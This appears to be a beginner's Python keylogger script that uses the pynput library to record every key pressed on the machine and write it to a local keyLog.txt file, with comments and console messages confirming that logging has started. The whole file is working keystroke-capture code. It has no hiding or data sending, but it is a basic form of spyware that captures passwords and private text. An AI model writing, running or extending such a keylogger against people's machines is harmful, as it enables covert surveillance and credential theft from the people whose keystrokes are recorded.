import os
from pynput.keyboard import Listener
import logging


# path of current project
log_dir =os.getcwd()  

# confirmation of path of keyLog.txt file
print(f"Current log path={os.path.join(log_dir,'keyLog.txt')}") 


# Setting up logging for logging key into the keyLog.txt file
logging.basicConfig(filename =os.path.join(log_dir,'keyLog.txt') , level=logging.INFO, format='%(message)s') 


def on_press(key):
	print("LOGGING")
	logging.info(str(key))


if __name__ == "__main__":
	# Listener Object is a beckend function imported from pynput does all the work, You can 
	# give it an on_press and/or an on_release function..
	with Listener(on_press=on_press) as listener:
		# To check in cmd if it started recording our keystrikes
		print("Scipt Started")
		
		# as a key is striked trigger functions as given in parameter.
		listener.join() 


		